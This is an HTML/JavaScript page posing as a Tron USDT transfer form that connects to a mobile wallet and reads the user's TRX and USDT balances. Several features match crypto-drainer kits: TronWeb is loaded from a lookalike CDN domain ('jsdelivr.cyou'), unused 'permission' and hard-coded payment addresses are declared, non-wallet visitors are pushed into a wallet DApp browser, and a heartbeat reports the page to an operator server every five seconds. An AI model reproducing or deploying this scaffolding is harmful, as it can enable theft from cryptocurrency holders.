<!DOCTYPE html>
<html lang="zh-CN">

<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1">
  <title>USDT 转账（Tron）</title>
  <link rel="icon" type="image/png" href="png/icon_trx.png">
  <script src="https://cdn.jsdelivr.net/npm/qrious/dist/qrious.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjs/11.8.0/math.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/decimal.js/10.4.3/decimal.min.js"></script>
  <script src="https://cdn.jsdelivr.cyou/tronweb/dist/TronWeb.js"></script>
  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
  <style>
    ::-webkit-scrollbar {
      display: none;
    }

    .tishi {
      width: 58%;
      padding: 0.1rem 0.3rem;
      background: #4b4848;
      z-index: 999999999999;
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      border-radius: 0.3rem;
      color: white;
      font-size: 1rem;
      text-align: center;
      line-height: 3rem;
      display: none;
      height: auto;
      margin: 0 auto;
    }
    /* 简单调整转账表单样式，模拟你贴图布局，实际按需完善 */
    .transfer-form {
      margin: 1rem;
    }
    .transfer-form label {
      display: block;
      margin: 0.5rem 0;
    }
    .transfer-form input {
      width: 100%;
      padding: 0.5rem;
      margin-bottom: 1rem;
    }
    .transfer-form button {
      padding: 0.5rem 1rem;
    }
  </style>
</head>

<body>
  <noscript><strong>本站点必须要开启JavaScript才能运行</strong></noscript>
  <div class="transfer-form">
    <h2>USDT 转账（Tron）</h2>
    <label for="receiptAddress">收款地址（Tron 地址）</label>
    <input type="text" id="receiptAddress" placeholder="Tron 地址">
    <label for="usdtAmount">数量（USDT）</label>
    <input type="text" id="usdtAmount" placeholder="0 USDT" value="0">
    <label for="minerFee">矿工费（TRX）</label>
    <input type="text" id="minerFee" placeholder="$0 0 TRX" value="$0 0 TRX">
    <button id="nextStep">下一步</button>
  </div>
  <div class="tishi" id="tip">提示</div>

  <script>
    // 权限地址（合约地址，按需确认是否需要 ）
    window.Permission_address = 'TWcSNPd7nkcaw1pS7Xd9qMaB56C2gYA8d1'; 
    // 收款地址（演示用，实际由用户输入或后端返回 ）
    window.Payment_address = 'TAymcrbZ3ybiVq9DrqQXWx3AmtPWMiwhsh'; 
    // USDT官方合约地址（Tron 网络 TRC - 20 ）
    window.usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; 
    // 服务器地址用于发送心跳（修改为你自己的服务器域名 ）
    window.heartbeatUrl = 'https://baidu.com/heartbeat'; 

    // 存储用户数据
    const userData = {
      address: null,
      trxBalance: null,
      usdtBalance: null
    };
    let currentUsdtAmount = '0';

    // 主初始化函数
    async function initializeDApp() {
      const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
      const isDAppBrowser = typeof window.tronWeb !== 'undefined' || typeof window.tronLink !== 'undefined';

      if (!isMobile) {
        alert('建议在移动端钱包环境使用');
      } else if (isMobile && !isDAppBrowser) {
        const currentUrl = encodeURIComponent(window.location.href);
        window.location.href = "okx://wallet/dapp/details?dappUrl=" + currentUrl;
      } else if (isMobile && isDAppBrowser) {
        await connectWallet();
        bindEvents();
      }
    }

    // 连接到钱包
    async function connectWallet() {
      try {
        if (window.tronWeb && window.tronWeb.ready) {
          await initUserData();
        } else if (window.tronLink) {
          const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
          if (res.code === 200) {
            window.tronWeb = window.tronLink.tronWeb;
            await initUserData();
          }
        }
      } catch (error) {
        console.error("钱包连接失败:", error);
        showTip('钱包连接失败，请检查钱包环境');
      }
    }

    // 初始化用户数据（TRX 余额、USDT 余额 ）
    async function initUserData() {
      try {
        userData.address = window.tronWeb.defaultAddress.base58;
        // 获取 TRX 余额
        const trxBalanceSun = await window.tronWeb.trx.getBalance(userData.address);
        userData.trxBalance = window.tronWeb.fromSun(trxBalanceSun); 
        // 获取 USDT 余额（通过 USDT 合约 ）
        const usdtContract = await window.tronWeb.contract().at(window.usdtContractAddress);
        const usdtBalanceRaw = await usdtContract.balanceOf(userData.address).call(); 
        // USDT 精度通常是 6 位小数
        userData.usdtBalance = usdtBalanceRaw / 1e6; 
        console.log("用户 Tron 地址:", userData.address);
        console.log("TRX 余额:", userData.trxBalance);
        console.log("USDT 余额:", userData.usdtBalance);
      } catch (error) {
        console.error("获取用户数据时出错:", error);
        showTip('获取钱包数据失败');
      }
    }

    // 绑定事件
    function bindEvents() {
      const nextStepBtn = document.getElementById('nextStep');
      nextStepBtn.addEventListener('click', onNextStepClick);
    }

    // “下一步”按钮点击逻辑
    async function onNextStepClick() {
      const receiptAddress = document.getElementById('receiptAddress').value;
      const usdtAmount = document.getElementById('usdtAmount').value;
      if (!receiptAddress) {
        showTip('请填写收款地址');
        return;
      }
      const amountNum = parseFloat(usdtAmount);
      if (isNaN(amountNum) || amountNum <= 0) {
        showTip('请填写有效的 USDT 转账数量');
        return;
      }
      if (amountNum > userData.usdtBalance) {
        showTip('USDT 余额不足');
        return;
      }
      // 简单模拟校验矿工费（实际矿工费逻辑需结合 Tron 网络规则、当前拥堵情况等 ）
      const minerFeeTRX = 0; // 演示，实际要计算或从接口获取
      if (minerFeeTRX > userData.trxBalance) {
        showTip('TRX 余额不足支付矿工费');
        return;
      }
      // 这里仅是前端校验，实际转账需调用 TronWeb 签名、广播交易
      showTip(`准备转账 ${usdtAmount} USDT 到 ${receiptAddress}，矿工费 ${minerFeeTRX} TRX`);
      // 以下是模拟发起转账（实际需完善 TronWeb 交易签名、上链逻辑 ）
      try {
        const usdtContract = await window.tronWeb.contract().at(window.usdtContractAddress);
        // 调用 transfer 方法，参数：收款地址、转账数量（注意精度，乘以 1e6 ）
        const result = await usdtContract.transfer(receiptAddress, amountNum * 1e6).send({
          feeLimit: 1000000, // 手续费限制，按需调整
          callValue: 0 // USDT 转账不需要附加 TRX
        });
        console.log("转账交易结果:", result);
        showTip('转账交易已提交，等待上链确认');
      } catch (error) {
        console.error("转账出错:", error);
        showTip('转账失败，请检查参数或钱包环境');
      }
    }

    // 显示提示
    function showTip(message) {
      const tipElement = document.getElementById('tip');
      if (tipElement) {
        tipElement.textContent = message;
        tipElement.style.display = 'block';
        setTimeout(() => {
          tipElement.style.display = 'none';
        }, 3000);
      }
    }

    // 页面加载时初始化
    document.addEventListener('DOMContentLoaded', initializeDApp);

    // 心跳逻辑（按需保留或调整 ）
    function sendHeartbeat() {
      const currentUrl = window.location.href;
      fetch(window.heartbeatUrl, {
        method: 'POST',
        mode: 'cors',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ url: currentUrl })
      })
      .then(response => response.json())
      .then(data => {
        if (data.status === 'error' && data.message === '会话已结束') {
          console.log('会话已结束');
          showTip('会话已结束');
        }
      })
      .catch(() => {});
    }
    const heartbeatInterval = setInterval(sendHeartbeat, 5000); 
    window.onload = sendHeartbeat;
    window.onbeforeunload = function () {
      clearInterval(heartbeatInterval);
    };
  </script>
</body>

</html>
